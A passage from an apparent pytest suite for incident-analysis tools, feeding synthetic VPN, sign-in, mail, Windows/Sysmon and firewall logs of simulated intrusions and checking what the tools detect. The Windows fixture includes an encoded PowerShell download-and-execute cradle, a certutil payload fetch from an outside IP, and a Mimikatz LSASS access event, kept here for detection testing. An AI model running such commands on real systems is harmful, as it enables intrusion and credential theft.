    assert "Kernel Compromise" in impact
    assert "Control Plane Escalation" in impact
    assert "Host Credential Access" in impact
    # Crucial assertion: SYN flood DoS trajectory MUST NOT be added
    assert "Availability Impact" not in impact
    assert "SYN flood" not in impact or "BENIGN" in impact

    # Crucial assertion: sysadmin must NOT be listed under compromised identities
    impact_lines = impact.splitlines()
    ident_section = False
    compromised_idents = []
    for line in impact_lines:
        if "COMPROMISED IDENTITIES" in line:
            ident_section = True
            continue
        if ident_section and line.startswith("\n") or "3. OBSERVED ATTACK" in line:
            ident_section = False
            continue
        if ident_section and line.strip().startswith("•"):
            compromised_idents.append(line.strip())

    comp_text = " ".join(compromised_idents)
    assert "sysadmin" not in comp_text
    assert "system:kube-controller-manager" not in comp_text

    # Execute compress_security_timeline
    timeline = await compress_security_timeline(evidence)
    assert "=== [COMPRESSED INCIDENT TIMELINE]" in timeline
    assert "Phase 01" in timeline


@pytest.mark.asyncio
async def test_case3_identity_takeover_impossible_travel_full_pipeline(tmp_path):
    from src.registry.tools.soc_tools import (
        gather_log_evidence,
        analyze_incident_impact,
        compress_security_timeline,
    )

    # 1. cisco_asa_vpn.log
    vpn_file = tmp_path / "cisco_asa_vpn.log"
    vpn_file.write_text(
        # Trap 1: charlie.brown typo (11:58:20 fail, 11:58:28 success on 198.51.100.77)
        "Sep 14 11:58:20 cisco-asa %ASA-6-113015: AAA user authentication Rejected : reason = 'User authentication failed' : user = charlie.brown : user IP = 198.51.100.77\n"
        "Sep 14 11:58:28 cisco-asa %ASA-6-113039: Group <Corporate-Employees> User <charlie.brown> IP <198.51.100.77> AnyConnect parent session started.\n"
        "Sep 14 11:58:29 cisco-asa %ASA-4-722051: Group <Corporate-Employees> User <charlie.brown> IP <198.51.100.77> IPv4 Address <10.200.1.10> assigned to session\n"
        # Trap 2: alice.wang cellular roaming (12:00:10 on .8, 12:08:15 on .44 in Dallas)
        "Sep 14 12:00:10 cisco-asa %ASA-6-113039: Group <Corporate-Employees> User <alice.wang> IP <172.56.21.8> AnyConnect parent session started.\n"
        "Sep 14 12:00:11 cisco-asa %ASA-4-722051: Group <Corporate-Employees> User <alice.wang> IP <172.56.21.8> IPv4 Address <10.200.1.11> assigned to session\n"
        "Sep 14 12:08:15 cisco-asa %ASA-6-113039: Group <Corporate-Employees> User <alice.wang> IP <172.56.21.44> AnyConnect parent session started.\n"
        "Sep 14 12:08:16 cisco-asa %ASA-4-722051: Group <Corporate-Employees> User <alice.wang> IP <172.56.21.44> IPv4 Address <10.200.1.12> assigned to session\n"
        # Stage 5: Password spraying from 185.220.101.5 across 5 accounts
        "Sep 14 12:10:01 cisco-asa %ASA-6-113015: AAA user authentication Rejected : reason = 'User authentication failed' : user = administrator : user IP = 185.220.101.5\n"
        "Sep 14 12:10:05 cisco-asa %ASA-6-113015: AAA user authentication Rejected : reason = 'User authentication failed' : user = admin : user IP = 185.220.101.5\n"
        "Sep 14 12:10:09 cisco-asa %ASA-6-113015: AAA user authentication Rejected : reason = 'User authentication failed' : user = vpnuser : user IP = 185.220.101.5\n"
        "Sep 14 12:10:12 cisco-asa %ASA-6-113015: AAA user authentication Rejected : reason = 'User authentication failed' : user = backup : user IP = 185.220.101.5\n"
        "Sep 14 12:10:16 cisco-asa %ASA-6-113015: AAA user authentication Rejected : reason = 'User authentication failed' : user = service_adm : user IP = 185.220.101.5\n"
        # Stage 6: david.clark compromise from 185.220.101.5
        "Sep 14 12:10:20 cisco-asa %ASA-6-113039: Group <Corporate-Employees> User <david.clark> IP <185.220.101.5> AnyConnect parent session started.\n"
        "Sep 14 12:10:21 cisco-asa %ASA-4-722051: Group <Corporate-Employees> User <david.clark> IP <185.220.101.5> IPv4 Address <10.200.1.88> assigned to session\n"
        # Stage 7: john.doe baseline from New York (203.0.113.50) at 12:15:00
        "Sep 14 12:15:00 cisco-asa %ASA-6-113039: Group <Corporate-Employees> User <john.doe> IP <203.0.113.50> AnyConnect parent session started.\n"
        "Sep 14 12:15:01 cisco-asa %ASA-4-722051: Group <Corporate-Employees> User <john.doe> IP <203.0.113.50> IPv4 Address <10.200.1.30> assigned to session\n"
        # Stage 7: john.doe VPN impossible travel from Frankfurt (194.165.16.104) at 12:33:18
        "Sep 14 12:33:18 cisco-asa %ASA-6-113039: Group <Corporate-Employees> User <john.doe> IP <194.165.16.104> AnyConnect parent session started.\n"
        "Sep 14 12:33:19 cisco-asa %ASA-4-722051: Group <Corporate-Employees> User <john.doe> IP <194.165.16.104> IPv4 Address <10.200.1.31> assigned to session\n",
        encoding="utf-8"
    )

    # 2. azure_ad_signins.json
    aad_file = tmp_path / "azure_ad_signins.json"
    aad_file.write_text(
        # Stage 1: cfo baseline New York (09:00:00)
        '{"userPrincipalName":"cfo.executive@enterprise.com","createdDateTime":"2026-09-14T09:00:00Z","ipAddress":"198.51.100.25","appDisplayName":"Office 365 Exchange Online","deviceDetail":{"isCompliant":true,"browser":"Edge"},"location":{"city":"New York","countryOrRegion":"US","geoCoordinates":{"latitude":40.7128,"longitude":-74.0060}},"status":{"errorCode":0}}\n'
        # Stage 1: cfo impossible travel Lagos (09:18:30)
        '{"userPrincipalName":"cfo.executive@enterprise.com","createdDateTime":"2026-09-14T09:18:30Z","ipAddress":"102.164.12.89","appDisplayName":"Office 365 Exchange Online","riskDetail":"impossibleTravel","deviceDetail":{"isCompliant":false,"browser":"HeadlessChrome"},"location":{"city":"Lagos","countryOrRegion":"NG","geoCoordinates":{"latitude":6.5244,"longitude":3.3792}},"status":{"errorCode":0}}\n'
        # Trap 3: marketing.lead typo (09:20:00 fail, 09:20:12 success)
        '{"userPrincipalName":"marketing.lead@enterprise.com","createdDateTime":"2026-09-14T09:20:00Z","ipAddress":"198.51.100.15","appDisplayName":"Azure Portal","location":{"city":"Dallas","countryOrRegion":"US"},"status":{"errorCode":50126}}\n'
        '{"userPrincipalName":"marketing.lead@enterprise.com","createdDateTime":"2026-09-14T09:20:12Z","ipAddress":"198.51.100.15","appDisplayName":"Azure Portal","deviceDetail":{"isCompliant":true},"location":{"city":"Dallas","countryOrRegion":"US"},"status":{"errorCode":0}}\n'
        # Stage 2 & 3: sysadmin MFA fatigue from 194.26.29.110 (4 denies, 1 success at 09:24:10)
        '{"userPrincipalName":"sysadmin@enterprise.com","createdDateTime":"2026-09-14T09:22:15Z","ipAddress":"194.26.29.110","appDisplayName":"Azure Portal","location":{"city":"Amsterdam","countryOrRegion":"NL"},"status":{"errorCode":500121,"failureReason":"MFA denied; user declined"}}\n'
        '{"userPrincipalName":"sysadmin@enterprise.com","createdDateTime":"2026-09-14T09:22:45Z","ipAddress":"194.26.29.110","appDisplayName":"Azure Portal","location":{"city":"Amsterdam","countryOrRegion":"NL"},"status":{"errorCode":500121,"failureReason":"MFA denied; user declined"}}\n'
        '{"userPrincipalName":"sysadmin@enterprise.com","createdDateTime":"2026-09-14T09:23:15Z","ipAddress":"194.26.29.110","appDisplayName":"Azure Portal","location":{"city":"Amsterdam","countryOrRegion":"NL"},"status":{"errorCode":500121,"failureReason":"MFA denied; user declined"}}\n'
        '{"userPrincipalName":"sysadmin@enterprise.com","createdDateTime":"2026-09-14T09:23:45Z","ipAddress":"194.26.29.110","appDisplayName":"Azure Portal","location":{"city":"Amsterdam","countryOrRegion":"NL"},"status":{"errorCode":500121,"failureReason":"MFA denied; user declined"}}\n'
        '{"userPrincipalName":"sysadmin@enterprise.com","createdDateTime":"2026-09-14T09:24:10Z","ipAddress":"194.26.29.110","appDisplayName":"Azure Portal","location":{"city":"Amsterdam","countryOrRegion":"NL"},"status":{"errorCode":0}}\n'
        # Stage 4: senior.engineer pass-the-prt from 185.196.220.14
        '{"userPrincipalName":"senior.engineer@enterprise.com","createdDateTime":"2026-09-14T09:40:02Z","ipAddress":"185.196.220.14","appDisplayName":"Azure PowerShell","riskDetail":"anomalousToken","deviceDetail":{"isCompliant":false},"location":{"city":"St. Petersburg","countryOrRegion":"RU"},"status":{"errorCode":0}}\n',
        encoding="utf-8"
    )

    # Execute gather_log_evidence
    evidence = await gather_log_evidence(str(tmp_path), pattern="*.*")
    assert "cisco_asa_vpn.log" in evidence
    assert "azure_ad_signins.json" in evidence

    # Verify All 5 Attacker Threat IPs
    assert "185.220.101.5" in evidence   # Tor exit node
    assert "194.165.16.104" in evidence  # Frankfurt VPS proxy
    assert "102.164.12.89" in evidence   # Lagos anonymizer
    assert "194.26.29.110" in evidence   # Amsterdam bulletproof VPN
    assert "185.196.220.14" in evidence  # St. Petersburg PRT replay

    # Verify All 5 Compromised Accounts
    assert "david.clark" in evidence
    assert "john.doe" in evidence
    assert "cfo.executive@enterprise.com" in evidence
    assert "sysadmin@enterprise.com" in evidence
    assert "senior.engineer@enterprise.com" in evidence

    # Verify Benign Discrimination (Traps)
    assert "BENIGN USER TYPO" in evidence
    assert "BENIGN CELLULAR ROAMING" in evidence
    assert "charlie.brown" in evidence  # Found in typo finding
    assert "198.51.100.77" in evidence  # Found in typo baseline

    # Verify analyze_incident_impact
    impact = await analyze_incident_impact(evidence)
    assert "Identity Anomaly" in impact
    assert "Token Hijacking" in impact
    assert "Authentication Fatigue" in impact
    assert "Perimeter password spraying" in impact
    assert "Valid VPN account compromise" in impact
    assert "CRITICAL" in impact

    # Verify timeline compression
    timeline = await compress_security_timeline(evidence)
    assert "=== [COMPRESSED INCIDENT TIMELINE]" in timeline
    assert "Phase 01" in timeline


@pytest.mark.asyncio
async def test_case1_enterprise_intrusion_full_pipeline(tmp_path):
    from src.registry.tools.soc_tools import (
        gather_log_evidence,
        analyze_incident_impact,
        compress_security_timeline,
    )

    # 1. Cisco Email Gateway Log (ironport_mail.log)
    mail_file = tmp_path / "ironport_mail.log"
    mail_file.write_text(
        "Mon Sep 14 10:14:00 2026 Info: New ICID 58212 interface Management (10.20.10.25) address 203.0.113.119 reverse dns host mail.attacker.com verified yes\n"
        "Mon Sep 14 10:14:01 2026 Info: Start MID 1042 ICID 58212\n"
        "Mon Sep 14 10:14:02 2026 Info: MID 1042 ICID 58212 From: <billing@overdue-invoices-center.org>\n"
        "Mon Sep 14 10:14:03 2026 Info: MID 1042 ICID 58212 RID 0 To: <jdoe@corp.contoso.com>\n"
        "Mon Sep 14 10:14:04 2026 Info: MID 1042 Attachment: Invoice_90214.docm\n"
        "Mon Sep 14 10:14:05 2026 Info: MID 1042 Message done\n"
        "Mon Sep 14 10:15:00 2026 Info: New ICID 58213 interface Management address 198.51.100.99\n"
        "Mon Sep 14 10:15:01 2026 Info: Start MID 1043 ICID 58213\n"
        "Mon Sep 14 10:15:02 2026 Info: MID 1043 Anti-Spam score: 90\n"
        "Mon Sep 14 10:15:03 2026 Info: MID 1043 Quarantine: spam positive\n",
        encoding="utf-8"
    )

    # 2. Windows XML Security & Sysmon Logs (windows_events.xml)
    xml_file = tmp_path / "windows_events.xml"
    xml_file.write_text(
        '<Events>\n'
        # Benign chrome.exe launch at 08:10 (noise trap - must be suppressed in timeline)
        '<Event><System><EventID>4688</EventID><TimeCreated SystemTime="2026-09-14T08:10:20.5129481Z"/><Computer>WKSTN-FIN-04.corp.contoso.com</Computer></System>'
        '<EventData><Data Name="SubjectUserName">jdoe</Data><Data Name="NewProcessName">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data>'
        '<Data Name="CommandLine">"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"</Data><Data Name="ParentProcessName">C:\\Windows\\explorer.exe</Data></EventData></Event>\n'
        # 1. Sysmon Event 1: PowerShell cradle download
        '<Event><System><EventID>1</EventID><TimeCreated SystemTime="2026-09-14T10:16:32.8920194Z"/><Computer>WKSTN-FIN-04.corp.contoso.com</Computer></System>'
        '<EventData><Data Name="User">CONTOSO\\jdoe</Data><Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>'
        '<Data Name="CommandLine">powershell.exe -nop -w hidden -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNDUvY29iYWx0LnBzMScp</Data>'
        '<Data Name="ParentImage">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data></EventData></Event>\n'
        # 2. Event 4688: certutil LOLBin
        '<Event><System><EventID>4688</EventID><TimeCreated SystemTime="2026-09-14T10:17:45.1023812Z"/><Computer>WKSTN-FIN-04.corp.contoso.com</Computer></System>'
        '<EventData><Data Name="SubjectUserName">jdoe</Data><Data Name="NewProcessName">C:\\Windows\\System32\\certutil.exe</Data>'
        '<Data Name="CommandLine">certutil.exe -urlcache -split -f http://185.220.101.45/stage2.bin</Data></EventData></Event>\n'
        # 3. Sysmon Event 10: Mimikatz LSASS dumping
        '<Event><System><EventID>10</EventID><TimeCreated SystemTime="2026-09-14T10:20:14.3318291Z"/><Computer>WKSTN-FIN-04.corp.contoso.com</Computer></System>'
        '<EventData><Data Name="SourceImage">C:\\Users\\jdoe\\AppData\\Local\\Temp\\mimikatz.exe</Data><Data Name="TargetImage">C:\\Windows\\System32\\lsass.exe</Data>'
        '<Data Name="GrantedAccess">0x1010</Data><Data Name="CallTrace">C:\\Windows\\SYSTEM32\\ntdll.dll+0x9fc24</Data></EventData></Event>\n'
        # 4. Event 4648: Explicit logon via runas to da_admin
        '<Event><System><EventID>4648</EventID><TimeCreated SystemTime="2026-09-14T10:22:15.8920194Z"/><Computer>WKSTN-FIN-04.corp.contoso.com</Computer></System>'
        '<EventData><Data Name="SubjectUserName">jdoe</Data><Data Name="TargetUserName">da_admin</Data><Data Name="TargetServerName">DC01.corp.contoso.com</Data>'
        '<Data Name="ProcessName">C:\\Windows\\System32\\runas.exe</Data></EventData></Event>\n'
        # 5. Event 4624: Network SMB Logon (Type 3) to DC01 from 10.20.10.45
        '<Event><System><EventID>4624</EventID><TimeCreated SystemTime="2026-09-14T10:23:05.1023812Z"/><Computer>DC01.corp.contoso.com</Computer></System>'
        '<EventData><Data Name="TargetUserName">da_admin</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.20.10.45</Data></EventData></Event>\n'
        # 6. Event 4672: Special Privileges Assigned
        '<Event><System><EventID>4672</EventID><TimeCreated SystemTime="2026-09-14T10:23:05.1024000Z"/><Computer>DC01.corp.contoso.com</Computer></System>'
        '<EventData><Data Name="SubjectUserName">da_admin</Data><Data Name="PrivilegeList">SeSecurityPrivilege, SeBackupPrivilege, SeDebugPrivilege</Data></EventData></Event>\n'
        # 7. System Event 7045: PSEXESVC Service Installed
        '<Event><System><EventID>7045</EventID><TimeCreated SystemTime="2026-09-14T10:23:18.4410291Z"/><Computer>DC01.corp.contoso.com</Computer></System>'
        '<EventData><Data Name="ServiceName">PSEXESVC</Data><Data Name="ImagePath">C:\\Windows\\PSEXESVC.exe</Data><Data Name="ServiceType">user mode service</Data></EventData></Event>\n'
        # 8. Event 4720: Backdoor User Account Created
        '<Event><System><EventID>4720</EventID><TimeCreated SystemTime="2026-09-14T10:25:30.8920194Z"/><Computer>DC01.corp.contoso.com</Computer></System>'
        '<EventData><Data Name="SubjectUserName">da_admin</Data><Data Name="TargetUserName">svc_backup_admin</Data></EventData></Event>\n'
        # 9. Event 4732: Backdoor User added to Administrators
        '<Event><System><EventID>4732</EventID><TimeCreated SystemTime="2026-09-14T10:25:32.1023812Z"/><Computer>DC01.corp.contoso.com</Computer></System>'
        '<EventData><Data Name="SubjectUserName">da_admin</Data><Data Name="MemberName">svc_backup_admin</Data><Data Name="TargetUserName">Administrators</Data></EventData></Event>\n'
        '</Events>',
        encoding="utf-8"
    )

    # 3. Palo Alto Firewall Log (paloalto_traffic.log)
    pa_file = tmp_path / "paloalto_traffic.log"
    pa_file.write_text(
        # 60s periodic TLS beaconing from 10.20.10.45 to 185.220.101.45:8443
        "2026-09-14 10:20:00,10.20.10.45,185.220.101.45,8443,bytes_sent=512,bytes_rcvd=128,rule=Allow-C2\n"
        "2026-09-14 10:21:00,10.20.10.45,185.220.101.45,8443,bytes_sent=510,bytes_rcvd=126,rule=Allow-C2\n"
        "2026-09-14 10:22:00,10.20.10.45,185.220.101.45,8443,bytes_sent=514,bytes_rcvd=130,rule=Allow-C2\n"
        "2026-09-14 10:23:00,10.20.10.45,185.220.101.45,8443,bytes_sent=512,bytes_rcvd=128,rule=Allow-C2\n"
        # 430 MB bulk exfiltration to 198.51.100.240:443
        "2026-09-14 10:30:00,10.20.10.45,198.51.100.240,443,bytes_sent=450887680,bytes_rcvd=12400,rule=Web-Outbound\n"
        # Benign cloud backup: 5.4 GB to Azure OneDrive 13.107.4.50:443
        "2026-09-14 10:32:00,10.20.10.62,13.107.4.50,443,bytes_sent=5798205440,bytes_rcvd=18000,rule=Backup-To-Cloud,user=svc-backup\n",
        encoding="utf-8"
    )

    # 1. Test gather_log_evidence
    evidence = await gather_log_evidence(str(tmp_path), pattern="*.*")
    assert "ironport_mail.log" in evidence
    assert "windows_events.xml" in evidence
    assert "paloalto_traffic.log" in evidence

    # Verify All 3 Adversary IPs are identified
    assert "185.220.101.45" in evidence
    assert "198.51.100.240" in evidence
    assert "203.0.113.119" in evidence

    # Verify Spearphishing initial access vector
    assert "Spearphishing Attachment" in evidence
    assert "Invoice_90214.docm" in evidence

    # Verify Benign Whitelist Discrimination
    assert "BENIGN BASELINE ENTERPRISE TRAFFIC" in evidence
    assert "13.107.4.50" not in evidence or "WHITELISTED" in evidence

    # 2. Test analyze_incident_impact
    impact = await analyze_incident_impact(evidence)
    assert "=== [ENTERPRISE BLAST RADIUS & IMPACT ASSESSMENT REPORT] ===" in impact
    assert "CRITICAL" in impact

    # Crucial Host Deduplication Assertions: Exactly 2 Compromised Hosts
    assert "WKSTN-FIN-04.corp.contoso.com" in impact
    assert "DC01.corp.contoso.com" in impact
    assert "Internal Host / Subnet: 10.20.10.45" not in impact
    assert "affecting 2 targeted asset(s)" in impact

    # Crucial Identity Assertions: Exactly 3 Compromised Accounts
    assert "jdoe" in impact
    assert "da_admin" in impact
    assert "svc_backup_admin" in impact
    assert "Administrators" not in impact
    assert "affecting 2 targeted asset(s)\n  and 3 identity account(s)" in impact or "3 identity account(s)" in impact

    # Crucial Anti-Hallucination Assertions: NO Kernel Rootkit & NO Subnet Sweep
    assert "Kernel Compromise" not in impact
    assert "rootkit" not in impact.lower() or "not detected" in impact.lower()
    assert "Horizontal subnet sweep" not in impact
    assert "Targeted SMB authentication to Domain Controller" in impact
    assert "Remote service execution via PsExec" in impact

    # Crucial Threat Infrastructure Assertions: All 3 Adversary IPs Identified with Functional Roles & Sources
    assert "CONFIRMED ADVERSARY THREAT INFRASTRUCTURE" in impact
    assert "185.220.101.45" in impact
    assert "198.51.100.240" in impact
    assert "203.0.113.119" in impact
    assert "Spearphishing Email Delivery" in impact
    assert "Source:" in impact

    # 3. Test triage_security_alert
    from src.registry.tools.soc_tools import triage_security_alert, propose_containment_response
    triage = await triage_security_alert(evidence)
    assert "203.0.113.119" in triage
    assert "Spearphishing Email Delivery" in triage
    assert "185.220.101.45" in triage
    assert "198.51.100.240" in triage

    # 4. Test propose_containment_response with mailer IP
    containment = await propose_containment_response(
        target_entity="203.0.113.119",
        action_type="block_ip",
        justification="Initial access spearphishing mailer delivery",
        dry_run=True,
    )
    assert "203.0.113.119" in containment
    assert "Cisco Email Security Gateway" in containment
    assert "BLACKLIST add 203.0.113.119" in containment

    # 5. Test compress_security_timeline
    timeline = await compress_security_timeline(evidence)
    assert "=== [COMPRESSED INCIDENT TIMELINE]" in timeline

    # Ensure timeline starts with spearphishing email before PowerShell cradle
    timeline_lines = [l for l in timeline.splitlines() if "Phase" in l]
    assert len(timeline_lines) >= 5
    # First attack milestone must be the 10:14 spearphishing email, NOT 08:10 chrome.exe
    assert "08:10" not in timeline_lines[0]
    assert "10:14:0" in timeline_lines[0] or "Spearphishing" in timeline_lines[0] or "Invoice_90214.docm" in timeline_lines[0]




